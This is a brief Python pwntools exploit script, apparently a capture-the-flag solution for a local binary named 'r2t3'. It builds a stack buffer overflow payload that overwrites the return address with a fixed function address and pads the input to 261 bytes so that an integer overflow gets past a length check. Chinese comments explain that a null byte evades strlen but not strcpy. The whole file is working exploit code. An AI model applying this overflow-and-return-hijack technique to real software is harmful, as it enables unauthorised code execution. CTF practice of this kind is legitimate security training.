from pwn import *

context(log_level='debug')

io=process("./r2t3")

io.recv()

ret=0x80485A3


#'\x00'能绕过strlen  但绕不过strcpy

#那么通过整数溢出

payload=b'a'*(0x11+0x4)+p32(0x804858B)+b'A'*(261-21-4)


io.sendline(payload)

io.interactive()